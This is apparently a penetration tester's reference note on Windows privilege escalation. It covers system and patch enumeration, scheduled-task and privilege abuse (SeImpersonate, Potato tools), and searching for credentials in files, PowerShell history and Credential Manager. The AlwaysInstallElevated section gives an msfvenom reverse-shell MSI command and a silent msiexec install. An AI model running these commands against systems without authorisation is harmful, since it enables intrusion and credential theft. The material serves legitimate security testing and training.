---
tags:
  - "#type/tech-specific"
  - "#attack/privilege-escalation"
---
# Fundamentals

See:

- [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows|Fundamentals - Windows]]

# Pentesting

## Vulnerable Software

**Workflow:**

1. Enumerate OS version, versions of drivers and versions of installed applications.
2. Search for and use public exploits - see [[1 Methods/Security-Testing/4 Execution/Using Public Exploits|Using Public Exploits]]

### OS Exploits

**Note:**

- OS version: **Kernel exploits might make the system unusable** --> test them beforehand
- Drivers: are not updated very often, exploits may be available online

**Enumeration:**

| Command                                                                                                     | Purpose                                                                                                                                                                 |
| ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| cmd: `systeminfo`<br>PowerShell: `Get-ComputerInfo`                                                         | show detailed system info<br>Based on the build number, derive the windows version using [Wikipedia](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions). |
| cmd: `ver`                                                                                                  | show windows version                                                                                                                                                    |
| `Get-CimInstance -Class win32_quickfixengineering \| Where-Object { $_.Description -eq "Security Update" }` | List installed security updates                                                                                                                                         |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                                     | List installed updates                                                                                                                                                  |
| `driverquery`                                                                                               | list installed drivers                                                                                                                                                  |

### Application Exploits

**List installed applications:**

32 bit software - based on registry:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
```

64 bit software - based on registry:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
```

**Hint:** To get only an overview, filter the output with `| select displayname`.

Also check Program Files in Downloads and root folder by [[#Search Files]]

## Misconfigurations

### Service Hijacking

See [[2 Tech-Specifics/OS/Windows/Privilege Escalation - Windows/Service Hijacking|Service Hijacking]]

### Scheduled Tasks Executable Hijacking

Modify the executable that is used by a scheduled task - if the task is run by a higher privileged user, this is a privilege escalation vector.

**Workflow:**

1. enumerate scheduled tasks: `schtasks /query /fo LIST /v`
	- **Note:** the command output is very long - check for any unusual tasks
	- check:
		- user executing the task: `Run As User`
		- triggers set for task execution: `Last Run Time`, `Next Run Time`, `Schedule Type`
		- actions / executables: `Task To Run`
2. check privileges on the executable run by the task

### Privileges

#### SeImpersonatePrivilege

This is usually not granted to normal users, but to many service users such as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity.

Often possible when escalating privileges from an [[2 Tech-Specifics/Web/Web basics|IIS Web Server]]

If a user has the `SeImpersonatePrivilege` privilege set, [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#Named Pipes|Named Pipes]] can be used to impersonate another user. Open a named pipe and coerce a user to connect to it --> then it can be impersonated.

**Tools:**

- [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

#### SeBatchLogonRight

if user has the [Log on as a batch job](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/log-on-as-a-batch-job) permission set: schedule a task that is executed as the user

#### Further Privileges:

These privileges can lead to privilege escalation:

- SeBackupPrivilege: see [Github](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)
- SeAssignPrimaryToken
- SeLoadDriver
- SeDebugPrivilege: allows to debug (i.e. manipulate) processes of other users

### AlwaysInstallElevated

If windows installer files (.msi) always run with elevated privileges, we can create a malicious .msi file and run it on the target system

prerequisites: the following registry options have to be set:

`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

1. generate payload, eg using [[3 Tools/exploitation frameworks/Metasploit/msfvenom]]: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi -o malicious.msi`
2. transfer payload to target
3. start installer: `C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

## Sensitive Information

### Search Files

The following files might include sensitive information:

- [[2 Tech-Specifics/OS/Sensitive Files|Sensitive Files]]
- configuration files of installed software: (weak) configurations, credentials
- .txt files: credentials, spontaneous notes of users
- **password safe databases**
- relevant filetypes: `*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini, *.kdbx, *.kdb` etc.

Also see [[2 Tech-Specifics/OS/Windows/Credential Access - Windows/Local Credential Access - Windows|Local Credential Access - Windows]]

#### Interesting files listing snippet

This snippet lists:

- each users users home directory
- each users Document, Desktop and Downloads directories
- the root directory of each drive connected to the system

```powershell
& { $ErrorActionPreference = 'SilentlyContinue'; Write-Host "`n=== Available Drives ===" -ForegroundColor Green; Get-PSDrive -PSProvider FileSystem | ForEach-Object { Write-Host "`n-- Drive $($_.Name):\ --" -ForegroundColor Yellow; Get-ChildItem "$($_.Root)" | ForEach-Object { Write-Host "  $($_.FullName)" } }; Get-ChildItem "C:\Users" -Directory | ForEach-Object { $u = $_.FullName; Write-Host "`n=== User: $($_.Name) ===" -ForegroundColor Cyan; Write-Host "`n-- Home Folders --" -ForegroundColor Yellow; Get-ChildItem $u -Directory | ForEach-Object { Write-Host "  $($_.Name)" }; @("Documents","Desktop","Downloads") | ForEach-Object { $p = Join-Path $u $_; if (Test-Path $p -ErrorAction SilentlyContinue) { Write-Host "`n-- $_ --" -ForegroundColor Yellow; Get-ChildItem $p -Recurse | ForEach-Object { Write-Host "  $($_.FullName)" } } } } }
```

### Command History

On windows, there are multiple command logging mechanisms.

| Command                                                                                                                                                                                                                                                                                                                                    | Purpose                                                                                                                                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-History`                                                                                                                                                                                                                                                                                                                              | Show PowerShells native history                                                                                                                                                                                            |
| `cat (Get-PSReadlineOption).HistorySavePath`                                                                                                                                                                                                                                                                                               | Show PSReadline history<br>(this is not cleared by the well-known `Clear-History` command)                                                                                                                                 |
| 1. open Event Viewer<br>2. go to "Application and Services Logs" --> Microsoft --> Windows --> PowerShell or PowerShell-Core<br>3. Filter as described in [Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.5&viewFallbackFrom=powershell-7.2) | Check Script Blog Logging records<br>See: [Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.5&viewFallbackFrom=powershell-7.2) |

**Note:** Also [Transcript Files](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript) might contain relevant information.

### Unattend Files

file name: `Unattend.xml`

helps sysadmins to set up the windows system, sometimes is left on the system

may contain valuable info

### Windows Credential Manager

list services whose credentials are stored in Windows credential manager (might reveal external services & usernames): `cmdkey /list`
